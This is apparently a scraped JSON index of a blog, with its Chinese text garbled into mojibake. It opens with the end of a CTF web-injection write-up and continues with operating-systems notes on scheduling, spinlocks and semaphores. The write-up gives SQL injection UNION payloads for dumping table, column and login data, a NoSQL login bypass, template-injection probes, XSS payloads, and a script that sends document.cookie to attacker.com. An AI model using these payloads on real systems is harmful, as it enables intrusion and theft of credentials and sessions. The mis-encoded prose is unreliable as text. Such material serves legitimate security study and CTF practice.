¼çš„åˆ—æ•°ï¼‰äº†ä¹‹åä¾¿å¯ä»¥ï¼š 1. ç¡®è®¤æ‰€æœ‰è¡¨æ ¼åç§°ï¼š 1&#x27; UNION SELECT null, table_name, null, null FROM information_schema.tables WHERE table_schema=database() -- nullçš„æ•°é‡ä»¥åŠtable_nameçš„ä½ç½®å–å†³äºå½“å‰è¡¨æ ¼çš„å­—æ®µæ•°ï¼ˆä¸€å…±æœ‰å¤šå°‘åˆ—ï¼‰ä»¥åŠè¿”å›ç»“æœå…·ä½“ä¸ºå“ªä¸ªå­—æ®µï¼ˆåˆ—ï¼‰ã€‚ å‡è®¾å½“å‰è¡¨æ ¼å«åšä¸ºloginsã€‚ 2. ç¡®è®¤æŸä¸ªè¡¨æ ¼çš„æ‰€æœ‰åˆ—åï¼ˆå­—æ®µåï¼‰ï¼š 123&#x27; UNION SELECT 1, GROUP_CONCAT(column_name SEPARATOR &#x27;, &#x27;), null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; -- å¦‚æœä¸æˆåŠŸåˆ™å¯ä»¥ä¸€åˆ—ä¸€åˆ—ç¡®å®šï¼š 123456789&#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 0,1 -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 1,1 -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 2,1 -- &#x27; UNION SELECT 1, column_name, null, null FROM information_schema.columns WHERE table_name=&#x27;logins&#x27; LIMIT 3,1 -- ... 3. ç¡®è®¤æŸä¸ªè¡¨æ ¼æ‰€æœ‰åˆ—çš„å†…å®¹ï¼š å‡è®¾ç°åœ¨æœ‰4åˆ—å†…å®¹ï¼Œä¸ºa,b,c,dï¼Œåˆ™ç›´æ¥ç”¨Unionå³å¯ï¼š 1&#x27; UNION a, b, c, d FROM logins -- å¦‚æœå¤±è´¥åˆ™ä¹Ÿå¯ä»¥ä¸€é¡¹ä¸€é¡¹ç¡®å®šæŸä¸€åˆ—çš„å†…å®¹ï¼š 123456&#x27; UNION SELECT null, username, null, null FROM logins LIMIT 0,1 -- &#x27; UNION SELECT null, username, null, null FROM logins LIMIT 1,1 -- &#x27; UNION SELECT null, username, null, null FROM logins LIMIT 2,1 -- &#x27; UNION SELECT null, username, null, null FROM logins LIMIT 3,1 -- ... MangoDBï¼š 1234&#123; &quot;email&quot;: &#123;&quot;$ne&quot;: None&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: None&#125;&#125; æ¨¡æ¿æ³¨å…¥ Server-Side Template Injectionï¼ˆSSTIï¼‰æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆServer-side Template Injectionï¼Œç®€ç§°SSTIï¼‰æ˜¯æŒ‡æ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨æ¨¡æ¿å¼•æ“çš„åŸç”Ÿè¯­æ³•ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ°æ¨¡æ¿ä¸­ï¼Œè€Œè¯¥æ¨¡æ¿éšåä¼šåœ¨æœåŠ¡å™¨ç«¯è¢«æ‰§è¡Œã€‚ æ¨¡æ¿å¼•æ“çš„ä½œç”¨æ˜¯é€šè¿‡å°†å›ºå®šçš„æ¨¡æ¿ä¸åŠ¨æ€æ•°æ®ç»“åˆï¼Œæ¥ç”Ÿæˆç½‘é¡µã€‚å½“ç”¨æˆ·è¾“å…¥è¢«ç›´æ¥æ‹¼æ¥åˆ°æ¨¡æ¿ä¸­ï¼ˆè€Œä¸æ˜¯ä½œä¸ºæ•°æ®å®‰å…¨åœ°ä¼ å…¥ï¼‰æ—¶ï¼Œå°±å¯èƒ½å‘ç”ŸæœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»ã€‚è¿™æ ·ä¸€æ¥ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥ä»»æ„çš„æ¨¡æ¿æŒ‡ä»¤ï¼Œä»è€Œæ“æ§æ¨¡æ¿å¼•æ“ï¼Œå¾€å¾€æœ€ç»ˆèƒ½å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚ Jinja2æ¼æ´ï¼š 1&lt;p class=&quot;nes-text is-primary warrior-name&quot;&gt;&#123;warrior_name&#125;&lt;/p&gt; ï¼ˆå¤§æ‹¬å·é‡Œçš„å†…å®¹ä¸ºæœªè¿‡æ»¤çš„è¾“å…¥ï¼‰ æ³¨å…¥ï¼š 1&#123;&#123; 7*7 &#125;&#125; Makoæ¼æ´ï¼š 12345678from mako.template import Templatedef generate_render(converted_fonts): result = &#x27;&#x27;&#x27; &lt;tr&gt;&lt;td&gt;&#123;3&#125;&lt;/td&gt;&lt;/tr&gt; &#x27;&#x27;&#x27;.format(*converted_fonts) return Template(result).render() ï¼ˆå¤§æ‹¬å·é‡Œçš„å†…å®¹ä¸ºæœªè¿‡æ»¤çš„è¾“å…¥ï¼‰ æ³¨å…¥ï¼š 1$&#123;7*7&#125; PugXSSæ¼æ´1&lt;p&gt;You requested help in the &#123;&#123;ln|safe&#125;&#125; language!&lt;/p&gt; |safe ä¼šç›´æ¥æ”¾è¡Œæˆ‘ä»¬çš„ä»»æ„è¾“å…¥ã€‚ æ³¨å…¥æµ‹è¯•Payloadï¼š 123456789&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt; &lt;svg onload=alert(1)&gt; &lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;&lt;iframe onload=alert(1)&gt; æ™®é€šçš„xssæ”»å‡»æ¨¡æ¿ï¼š 1&lt;script&gt;fetch(&quot;http://attacker.com?cookie=&quot; + document.cookie); &lt;/script&gt; å¯ä»¥åœ¨ https://requestbin.kanbanbox.com/ åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„RequestBinã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"}]},{"title":"GBS 2 Prozess- und Prozessorverwaltung è¿›ç¨‹ä¸å¤„ç†å™¨ç®¡ç†","slug":"TUM info ç¬”è®°/GBS/GBS-2-Prozess-und-Prozessorverwaltung-è¿›ç¨‹ä¸å¤„ç†å™¨ç®¡ç†","date":"2025-04-03T21:21:10.000Z","updated":"2025-04-26T18:30:46.287Z","comments":true,"path":"2025/04/03/TUM info ç¬”è®°/GBS/GBS-2-Prozess-und-Prozessorverwaltung-è¿›ç¨‹ä¸å¤„ç†å™¨ç®¡ç†/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-2-Prozess-und-Prozessorverwaltung-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%A4%84%E7%90%86%E5%99%A8%E7%AE%A1%E7%90%86/","excerpt":"æ“ä½œç³»ç»ŸåŸºç¡€ç›¸å…³ç¬”è®°","text":"è¿›ç¨‹ï¼ˆProzessï¼‰è¿›ç¨‹ç®¡ç†ï¼ˆProzessverwaltungï¼‰Dispathcerè°ƒåº¦ï¼ˆSchedulingï¼‰è°ƒåº¦ç­–ç•¥ï¼ˆScheduling-Strategienï¼‰First-Come-First-Served (FCFS) Shorttest Job First (SJF) Shortest Remaining Time Next (SRTN) Round-Robing Scheduling (RR) Proority Scheduling Earliest Deadline First (EDF) çº¿ç¨‹ï¼ˆThreadsï¼‰","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS æ“ä½œç³»ç»Ÿ","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/GBS-æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"è¿›ç¨‹","slug":"è¿›ç¨‹","permalink":"https://archer-baiyi.github.io/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"çº¿ç¨‹","slug":"çº¿ç¨‹","permalink":"https://archer-baiyi.github.io/tags/%E7%BA%BF%E7%A8%8B/"}]},{"title":"GBS 3 Parallele Systeme und Synchronisation å¹¶è¡Œç³»ç»Ÿä¸åŒæ­¥","slug":"TUM info ç¬”è®°/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-å¹¶è¡Œç³»ç»Ÿä¸åŒæ­¥","date":"2025-04-03T21:20:44.000Z","updated":"2025-04-26T18:30:50.840Z","comments":true,"path":"2025/04/03/TUM info ç¬”è®°/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-å¹¶è¡Œç³»ç»Ÿä¸åŒæ­¥/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-%E5%B9%B6%E8%A1%8C%E7%B3%BB%E7%BB%9F%E4%B8%8E%E5%90%8C%E6%AD%A5/","excerpt":"æ“ä½œç³»ç»ŸåŸºç¡€ç›¸å…³ç¬”è®°","text":"EinfÃ¼hrungå› ä¸ºï¼ˆå•æ ¸ï¼‰ç³»ç»Ÿæ— æ³•åšåˆ°çœŸæ­£çš„å¹¶è¡Œè¿›ç¨‹ï¼Œæ‰€ä»¥æ‰€è°“çš„parallelçš„æ´»åŠ¨ä¼šå¯¼è‡´ä¸ç¡®å®šæ€§ï¼ˆNichtdeterminismusï¼‰ï¼Œå³ç³»ç»Ÿåœ¨ç›¸åŒçš„åˆå§‹æ¡ä»¶å’Œç›¸åŒçš„è¾“å…¥ä¸‹è¡¨ç°å‡ºä¸åŒçš„è¡Œä¸ºã€‚ ä¾‹å­ï¼š å‡è®¾ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªå˜é‡ $x = 2$ï¼Œä»¥åŠ2ä¸ªè¿›ç¨‹ï¼š è¿›ç¨‹1ï¼š$x = x + 5$ è¿›ç¨‹2ï¼š$x = x \\cdot 2$ é‚£ä¹ˆå¦‚æœå…ˆè¿è¡Œè¿›ç¨‹1å†è¿è¡Œ2å°±ä¼šå¾—åˆ° $x = 14$ï¼Œå…ˆè¿è¡Œè¿›ç¨‹2å†è¿è¡Œ1å°±ä¼šå¾—åˆ° $x = 9$ ã€‚ ä»‹ç»å‡ ä¸ªæ¦‚å¿µï¼š ç«æ€æ¡ä»¶ï¼ˆRace Conditionï¼‰ï¼šè‡³å°‘ä¸¤ä¸ªè¿›ç¨‹åœ¨è¯»å–æˆ–å†™å…¥å…±äº«èµ„æºã€‚è¿™ä¸ªæ—¶å€™æœ€ç»ˆç»“æœä¼šä¾èµ–äºè¿›ç¨‹æ‰§è¡Œçš„é¡ºåºã€‚ ä¸´ç•ŒåŒºï¼ˆKritischer Abschnittï¼Œcritical section/regionï¼‰ï¼šè¿›ç¨‹ä¼šåœ¨ä¸´ç•ŒåŒºä¸­è®¿é—®å…±äº«èµ„æºï¼Œè€Œå¯¹äºåªèƒ½è¢«ç‹¬å ä½¿ç”¨çš„èµ„æºï¼Œè®¿é—®å°†è¢«é¡ºåºåŒ–/ä¸²è¡ŒåŒ–ï¼ˆsequentialisiertï¼‰ã€‚ æ‰€æœ‰è·Ÿå…±äº«èµ„æºç›¸å…³çš„æ“ä½œéƒ½ä¼šåœ¨ä¸´ç•ŒåŒºé‡Œæ‰§è¡Œã€‚ äº’æ–¥ï¼ˆWechselseitiger Ausschlussï¼ŒMutual Exclusionï¼‰ï¼šç¡®ä¿åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªè¿›ç¨‹/çº¿ç¨‹èƒ½è®¿é—®ä¸´ç•Œèµ„æºï¼ˆcritical sectionï¼‰ã€‚ äº’æ–¥çš„å®ç°ä¸€å…±éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š ä¸´ç•ŒåŒºå¿…é¡»æ˜¯äº’æ–¥è®¿é—®çš„ï¼ˆwechselseitig ausgeschlossenï¼‰ï¼Œå³åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªè¿›ç¨‹å¯ä»¥è¿›å…¥ä¸´ç•ŒåŒºï¼ˆkritischer Abschnittï¼‰ äº’æ–¥çš„å®ç°ä¸å¾—ä¾èµ–äºè¿›ç¨‹æ‰§è¡Œä¸´ç•ŒåŒºçš„é¡ºåºå‡è®¾ã€‚ äº’æ–¥çš„å®ç°ä¸å¾—ä¾èµ–äºè¿›ç¨‹æ‰§è¡Œæ—¶é—´çš„å‡è®¾ã€‚ ä¸èƒ½è®©æŸä¸ªè¿›ç¨‹æ— é™æœŸåœ°é˜»æ­¢å¦ä¸€ä¸ªè¿›ç¨‹è¿›å…¥ä¸´ç•ŒåŒºï¼Œå³é¿å…Starvationã€‚ å›¾è§£ï¼š åœ¨ä»¥ä¸‹å‡ ä¸ªå±‚é¢éƒ½æœ‰å¯¹åº”çš„åŠæ³•æ¥å®ç°äº’æ–¥/åŒæ­¥ï¼š ç¡¬ä»¶å±‚é¢ é€šè¿‡ç¦æ­¢ä¸­æ–­ï¼ˆInterrupts sperrenï¼‰å®ç°äº’æ–¥ï¼ˆå¦‚ä¸­æ–­å±è”½ï¼‰ ä½¿ç”¨åŸå­æœºå™¨æŒ‡ä»¤ï¼ˆå¦‚ TSLã€cmpxchgï¼‰ä¿éšœæ“ä½œä¸å¯åˆ†å‰²ï¼ˆatomicï¼‰ ç®€å•çš„ç³»ç»Ÿå±‚é¢ ä¸»åŠ¨ç­‰å¾…ï¼ˆå¦‚ï¼šSpin-Lockï¼Œbusy waitingï¼‰ è¢«åŠ¨ç­‰å¾…ï¼ˆå¦‚ï¼šsleep/wakeupï¼ŒèŠ‚çœ CPUï¼‰ æ›´é«˜çº§çš„æ“ä½œç³»ç»Ÿå±‚é¢ ä¿¡å·é‡ï¼ˆSemaphoreï¼‰ï¼šæ”¯æŒä¸»åŠ¨æˆ–è¢«åŠ¨ç­‰å¾… äº’æ–¥é”ï¼ˆMutexï¼‰ ç¼–ç¨‹è¯­è¨€å±‚é¢ ç›‘è§†å™¨ï¼ˆMonitorï¼‰æ¦‚å¿µï¼šè¯­è¨€å±‚çº§çš„åŒæ­¥æŠ½è±¡ ç¡¬ä»¶å±‚é¢ä¸­æ–­å±è”½ï¼ˆUnterbrechnungssperreï¼‰ä¸­æ–­ï¼ˆInterrupt, Unterbrechung ï¼‰æ˜¯é€šè¿‡ä¸“ç”¨çš„ä¸­æ–­çº¿è·¯å‘å‡ºçš„ä¿¡å·ï¼Œä¾‹å¦‚ï¼š I/O è®¾å¤‡å‘å‡ºä¿¡å·è¡¨ç¤ºä»»åŠ¡å·²å®Œæˆ å®šæ—¶å™¨å‘å‡ºä¿¡å·è¡¨ç¤ºæ—¶é—´ç‰‡å·²ç”¨å°½ è€Œä¸­æ–­ä¼šæ‰“æ–­å½“å‰çš„æ´»åŠ¨è¿›ç¨‹ï¼Œå°†å…¶è½¬ä¸ºå°±ç»ª/ç­‰å¾…çŠ¶æ€ï¼ˆrechenwillig/wartendï¼‰ï¼Œç„¶åInterrupt Handlerä¼šæ¥å¤„ç†è¿™ä¸ªä¸­æ–­ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å±è”½ä¸­æ–­æ¥å®ç°äº’æ–¥è®¿é—®ï¼šè®© CPU æš‚æ—¶ç¦æ­¢å¤„ç†ä¸­æ–­ï¼ˆtemporarily prevent the CPU from responding to interruptsï¼‰ï¼Œé˜²æ­¢å½“å‰è¿›ç¨‹åœ¨æ‰§è¡ŒæœŸé—´è¢«å¼ºåˆ¶è®©å‡º CPUï¼Œè¿™æ ·ä¸€æ¥è¿›ç¨‹å°±å¯ä»¥ä¸è¢«æ‰“æ‰°åœ°å®Œæˆå…¶ä¸´ç•ŒåŒºæ“ä½œã€‚ åªä¸è¿‡è¿™ä¸ªæ–¹æ³•ï¼ˆä¸­æ–­å±è”½ï¼‰åªé€‚ç”¨äºå•å¤„ç†å™¨ç³»ç»Ÿæ¥å®ç°ä¸´ç•ŒåŒºï¼Œå› ä¸ºåœ¨å¤šå¤„ç†å™¨ç³»ç»Ÿä¸­ï¼Œå³ä½¿ä¸€ä¸ª CPU ç¦ç”¨äº†ä¸­æ–­ï¼Œå…¶ä»– CPU ä»ç„¶å¯ä»¥è®¿é—®å…±äº«èµ„æºã€‚ å¹¶ä¸”å®æ–½æ—¶éœ€è¦æ³¨æ„å‡ ç‚¹ï¼š ç¡®ä¿ç”±ä¸­æ–­å±è”½ä¿æŠ¤çš„ä¸´ç•ŒåŒºå¿…é¡»å¾ˆçŸ­ã€‚ å› ä¸ºæ‰€æœ‰ä¸­æ–­éƒ½æ˜¯æœ‰æ„ä¹‰çš„ï¼Œéšä¾¿å±è”½çš„è¯ç³»ç»Ÿå®¹æ˜“å‡ºé—®é¢˜ã€‚ è¯¥æœºåˆ¶æœ€å¤šåªåº”åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­ä½¿ç”¨ã€‚ ä¸ºäº†å®‰å…¨æ€§è€ƒè™‘ã€‚ åŸå­æ€§æœºå™¨æŒ‡ä»¤ï¼ˆAtomare Maschinenbefehleï¼‰å¤§å¤šæ•°è®¡ç®—æœºæ¶æ„éƒ½å…·å¤‡ä¸“é—¨ç”¨äºåŸå­æ“ä½œçš„æœºå™¨æŒ‡ä»¤ï¼Œæˆ‘ä»¬è¿™é‡Œä»¥å…¶ä¸­çš„ TSLï¼ˆTest-and-Set Lockï¼‰ä¸ºä¾‹å­ã€‚ å…·ä½“å®ç°çš„è¯éœ€è¦å…ˆå®šä¹‰2ä¸ªå‡½æ•°ï¼šenter_crit_regionå’Œleave_crit_region ã€‚ï¼ˆè§ä¸‹æ–¹ä»£ç ï¼‰ å…·ä½“æµç¨‹ï¼š é€šè¿‡å…±äº«å˜é‡ lock å¯¹å†…å­˜è®¿é—®è¿›è¡ŒåŒæ­¥ åœ¨è¿›å…¥ä¸´ç•ŒåŒºä¹‹å‰ï¼Œè¿›ç¨‹ P ä¼šè°ƒç”¨ enter_crit_region å¦‚æœ lock == 0ï¼Œåˆ™è¿›ç¨‹ P å¯ä»¥æ‰§è¡Œå…¶ä¸´ç•ŒåŒºä»£ç  å¦åˆ™ï¼Œè¿›ç¨‹å¿…é¡»ä¸»åŠ¨ç­‰å¾…ï¼ˆå¿™ç­‰ï¼Œbusy waitingï¼‰ï¼Œç›´åˆ° lock è¢«é‡ç½®ä¸º 0 ä¸´ç•ŒåŒºç»“æŸåï¼Œè¿›ç¨‹ P å¿…é¡»é‡ç½®å…±äº«å˜é‡ lockï¼Œè°ƒç”¨ leave_crit_region enter_crit_regionï¼š 12345enter_crit_region: tsl rax, [lock] ; å°† lock çš„å€¼è¯»å…¥ raxï¼Œå¹¶å°† lock è®¾ç½®ä¸º 1ï¼ˆåŸå­æ“ä½œï¼‰ cmp rax, $0 ; åˆ¤æ–­åŸå€¼æ˜¯å¦ä¸º 0ï¼ˆé”æ˜¯å¦ç©ºé—²ï¼‰ jne enter_crit_region ; Busy Waitingï¼ˆä¸€ç›´ç­‰ï¼‰ ret ; å¦‚æœæ˜¯ 0ï¼Œè¡¨ç¤ºå¯ä»¥è¿›å…¥ä¸´ç•ŒåŒº leave_crit_regionï¼š 123leave_crit_region: mov [lock], $0 ; å°† lock é‡ç½®ä¸º 0ï¼Œé‡Šæ”¾é” ret ç®€å•çš„ç³»ç»Ÿå±‚é¢ä¸»åŠ¨ç­‰å¾…ï¼ˆAktives Wartenï¼‰åˆšæ‰æåˆ°çš„åŒæ­¥æ¦‚å¿µè¢«å«åšè‡ªæ—‹é”ï¼ˆSpin-Lockï¼‰ï¼šè¿›ç¨‹ä¼šåœ¨ä¸€ä¸ªå¾ªç¯ä¸­ä¸æ–­æ£€æŸ¥èµ„æºæ˜¯å¦ä»ç„¶è¢«å ç”¨ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„ä¸»åŠ¨ç­‰å¾…ï¼ˆAktives Wartenï¼‰ã€‚ ä½†æ˜¯ä¸€ç›´åœ¨è¿™é‡Œç­‰çš„è¯æ•ˆç‡éå¸¸ä½ä¸‹ã€‚ ç¤ºä¾‹ï¼š 123456/* busy waiting emulation */int main () &#123; while (shouldWait) &#123; // ä»€ä¹ˆéƒ½ä¸åšï¼Œåªæ˜¯ä¸€ç›´å¹²ç­‰ &#125;&#125; Passives Wartenï¼ˆè¢«åŠ¨ç­‰å¾…ï¼‰ç›¸æ¯”ä¹‹ä¸‹ Passives Wartenï¼ˆè¢«åŠ¨ç­‰å¾…ï¼‰ å°±è¦é«˜æ•ˆå¾ˆå¤šï¼šä¼šä½¿ç”¨ç³»ç»ŸæœåŠ¡ï¼ˆæ¯”å¦‚è¯´ sleepï¼‰è®©è¿›ç¨‹è¿›å…¥ç­‰å¾…çŠ¶æ€ï¼ˆwartendï¼‰ï¼Œæˆ–è€…ä½¿ç”¨ç³»ç»ŸæœåŠ¡ï¼ˆæ¯”å¦‚è¯´ wakeup ï¼‰è®©è¿›ç¨‹è¿›å…¥å¯è¿è¡ŒçŠ¶æ€ï¼ˆechenbereitï¼‰ã€‚ æ¯”å¦‚è¯´2ä¸ªè¿›ç¨‹ä¼ è¾“æ•°æ®ï¼ŒAä¼ ç»™Bã€‚Aä¼ çš„æ—¶å€™è®©Bè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œç­‰Aä¼ å®Œäº†å†æŠŠBå«èµ·æ¥è®©å®ƒå¤„ç†æ•°æ®ã€‚ ä¾‹å­ï¼šç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜ï¼ˆErzeuger-Verbraucher-Problemï¼‰åœ¨è¿™ä¸ªä¾‹å­ä¸­æˆ‘ä»¬ä¼šæœ‰2ä¸ªå¹¶è¡Œçš„è¿›ç¨‹ï¼šä¸€ä¸ªç”Ÿäº§è€…ï¼ˆErzeugerï¼Œproducerï¼‰å’Œä¸€ä¸ªæ¶ˆè´¹è€…ï¼ˆVerbraucherï¼Œconsumerï¼‰ã€‚ä¸¤è€…å…±ç”¨ä¸€ä¸ªç¼“å­˜åŒºï¼ˆPufferï¼ŒBufferï¼‰ã€‚å¯¹ç¼“å†²åŒºçš„è®¿é—®å¿…é¡»å®ç°äº’æ–¥ã€‚ å…ˆç»™ä¸€ä¸ªåä¾‹ï¼Œåç»­ä¼šæ…¢æ…¢çœ‹åˆ°å¦‚ä½•æ­£ç¡®è§£å†³è¿™ä¸ªé—®é¢˜ï¼š 123456789101112void producer(void) &#123; int item = 0; while (true) &#123; item = produce_item(); if (count == N) sleep(); insert_item(item); count = count + 1; // æ³¨æ„è¿™é‡Œ if (count == 1) wakeup(consumer); &#125;&#125; 123456789101112void consumer(void) &#123; int item = 0; while (true) &#123; if (count == 0) sleep(); item = remove_item(); count = count - 1; // æ³¨æ„è¿™é‡Œ if (count == N - 1) wakeup(producer); consume_item(item); &#125;&#125; å¯ä»¥çœ‹åˆ°è¿™é‡Œå¸Œæœ›é€šè¿‡ count æ¥å®ç°äº’æ–¥ï¼Œä½†é—®é¢˜æ˜¯ count æœ¬èº«å°±æ˜¯ä¸€ä¸ªå…±äº«å˜é‡ã€‚ æ›´é«˜çº§çš„æ“ä½œç³»ç»Ÿå±‚é¢ä¿¡å·é‡ï¼ˆSemaphoreï¼‰å®šä¹‰ï¼š ä¿¡å·é‡ï¼ˆSemaphoreï¼‰æ˜¯ä¸€ä¸ªæ•´æ•°æ§åˆ¶å˜é‡ s åœ¨è¿™ä¸ªå˜é‡ä¸Šå®šä¹‰äº†ä¸‰ç§æ“ä½œï¼š åˆå§‹åŒ–ï¼ˆInitialisierungï¼‰ Pï¼ˆdownã€waitï¼‰ Vï¼ˆupã€signalï¼‰ æ§åˆ¶å˜é‡çš„å€¼è¡¨ç¤ºï¼šå…è®¸å¤šå°‘ä¸ªè¿›ç¨‹åŒæ—¶è¿›å…¥ä¸´ç•ŒåŒº ï¼ˆPå’ŒVä»£è¡¨çš„æ˜¯Proberen å’Œ Verhogenï¼Œæ˜¯è·å…°è¯­ï¼Œå› ä¸ºæå‡ºä¿¡å·é‡è¿™ä¸ªæ¦‚å¿µçš„æ˜¯Dijkstraï¼Œä»–æ˜¯è·å…°äººã€‚ï¼‰ é‚£ä¹ˆè¿™ä¸¤ä¸ªæ“ä½œå…·ä½“æ˜¯æ€ä¹ˆå®šä¹‰çš„å‘¢ï¼š down æ“ä½œï¼ˆPï¼‰ï¼š æ§åˆ¶å˜é‡ s ä¼šè¢«å‡ä¸€ å¦‚æœ s &lt; 0ï¼Œå½“å‰è¿›ç¨‹ å¿…é¡»ç­‰å¾… è€Œåœ¨ä½¿ç”¨è¢«åŠ¨ç­‰å¾…çš„å®ç°ä¸­ï¼š è¿›ç¨‹ä¼šè¢«è½¬ä¸ºâ€œç­‰å¾…çŠ¶æ€â€ï¼Œå¹¶è¢«åŠ å…¥ç­‰å¾…é˜Ÿåˆ—ï¼ˆWait-Queueï¼‰ä¸­ç®¡ç† up æ“ä½œï¼ˆV ï¼‰ï¼š æ§åˆ¶å˜é‡ s ä¼šè¢«åŠ ä¸€ å¦‚æœä½¿ç”¨çš„æ˜¯è¢«åŠ¨ç­‰å¾…ï¼š å¦‚æœç­‰å¾…é˜Ÿåˆ—ä¸ä¸ºç©ºï¼Œåˆ™å”¤é†’å…¶ä¸­ä¸€ä¸ªè¿›ç¨‹ï¼ˆå˜ä¸ºå°±ç»ªçŠ¶æ€ï¼Œrechenbereit ï¼‰ ä»£ç ç¤ºä¾‹ï¼š 1234567void down(semaphore *wa) &#123; int* s = &amp;wa-&gt;s; // è®¿é—®waè¿™ä¸ªç»“æ„ä½“ä¸­sçš„å€¼ï¼Œç®€å•æ¥è®²å°±æ˜¯è®¿é—®å½“å‰sçš„å€¼ã€‚ *s -= 1; if (*s &lt; 0) &#123; thread_yield(wa-&gt;wait_queue); // æŠŠå½“å‰çº¿ç¨‹æŒ‚èµ·ï¼Œæ”¾å…¥ç­‰å¾…é˜Ÿåˆ— &#125;&#125; 1234567void up(semaphore *wa) &#123; int* s = &amp;wa-&gt;s; // è®¿é—®waè¿™ä¸ªç»“æ„ä½“ä¸­sçš„å€¼ï¼Œç®€å•æ¥è®²å°±æ˜¯è®¿é—®å½“å‰sçš„å€¼ã€‚ *s += 1; if (*s &lt;= 0) &#123; thread_wakeup(wa-&gt;wait_queue); // ä»ç­‰å¾…é˜Ÿåˆ—ä¸­å”¤é†’ä¸€ä¸ªçº¿ç¨‹ &#125;&#125; é‚£ä¹ˆæˆ‘ä»¬è¯¥æ€ä¹ˆä½¿ç”¨è¿™ä¸ªä¿¡å·é‡å‘¢ï¼Ÿ é¦–å…ˆå®šä¹‰ä¸€ä¸ªä¿¡å·é‡å¯¹è±¡ wa å°†æ§åˆ¶å˜é‡ s åˆå§‹åŒ–ä¸º 1ï¼ˆæˆ–æ›´å¤§çš„ nï¼‰ å–å†³äºæˆ‘ä»¬å¸Œæœ›æœ‰å¤šå°‘ä¸ªè¿›ç¨‹åŒæ—¶è¿›å…¥ä¸´ç•ŒåŒº ç”¨ P/V æ“ä½œåŒ…è£¹ä¸´ç•ŒåŒºä»£ç ï¼š 123down(&amp;wa); // Pæ“ä½œï¼šå°è¯•è¿›å…¥execute_crit_region(); // ä¸´ç•ŒåŒºæ“ä½œup(&amp;wa); // Væ“ä½œï¼šé‡Šæ”¾ä¿¡å·é‡ okï¼Œæˆ‘ä»¬ç°åœ¨æ‹¥æœ‰æ›´é«˜çº§çš„å·¥å…·äº†ï¼Œå†å›æ¥çœ‹ä¸€ä¸‹åˆšæ‰æ²¡æœ‰å®Œå…¨è§£å†³çš„ç”Ÿäº§è€…-æ¶ˆè´¹è€…-é—®é¢˜ã€‚ è¿˜æ˜¯å…ˆçœ‹ä¸€ä¸ªåä¾‹ï¼š åªä½¿ç”¨ä¸€ä¸ªä¿¡å·é‡ wa æ¥æ§åˆ¶å¯¹ç¼“å†²åŒºçš„è®¿é—®ï¼Œåˆå§‹åŒ–ä¸º1ã€‚ 1234567/* Producer */while (true) &#123; element = produce(); // ç”Ÿäº§ä¸€ä¸ªå…ƒç´  down(&amp;wa); // è¯·æ±‚è¿›å…¥ä¸´ç•ŒåŒº write_to_buf(W, element); // å†™å…¥ç¼“å†²åŒº up(&amp;wa); // é‡Šæ”¾ä¸´ç•ŒåŒº&#125; 1234567/* Consumer */while (true) &#123; down(&amp;wa); // è¯·æ±‚è¿›å…¥ä¸´ç•ŒåŒº element = read_from_buf(W); // ä»ç¼“å†²åŒºè¯»å–å…ƒç´  up(&amp;wa); // é‡Šæ”¾ä¸´ç•ŒåŒº consume(element); // æ¶ˆè´¹æ•°æ®&#125; 